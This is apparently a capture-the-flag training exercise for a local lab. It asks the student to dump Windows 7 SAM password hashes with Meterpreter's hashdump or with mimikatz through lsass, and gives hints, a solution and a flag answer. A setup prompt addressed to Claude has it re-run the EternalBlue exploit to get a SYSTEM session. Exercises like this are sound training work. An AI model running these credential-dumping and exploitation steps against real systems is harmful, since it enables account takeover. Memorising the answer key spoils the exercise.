# Q051 — SAM Database Dump

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `metasploit (meterpreter)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

After getting SYSTEM on Win7, run `hashdump` in Meterpreter. Report the **NTLM hash** of the local Administrator (RID 500) — placeholder format.

---

## 🎯 Flag Format

```
admin_rid=<n>; hash_format=<lm:ntlm>
```

Example: `admin_rid=500; hash_format=aad3b435...:31d6cfe...`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`meterpreter > hashdump`
</details>

<details>
<summary>Hint 2</summary>

Or migrate to lsass and use `mimikatz` via load kiwi.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
meterpreter > hashdump
```

Returns Administrator:500:<lm>:<ntlm>:::

**Answer:** `admin_rid=500; hash_format=lm:ntlm`

📖 Ref: [tools/mimikatz.md](../../tools/mimikatz.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q051:
1. Requires an existing SYSTEM-level Meterpreter session on Win7 (see Q042 to establish).
2. If no session live, re-run EternalBlue: ensure Win7 prereqs still met (SMBv1 on, MS17-010 unpatched).
3. hashdump command is run from meterpreter prompt — no extra setup.

Report back: "Lab ready for Q051 — SYSTEM meterpreter on Win7 available".
```
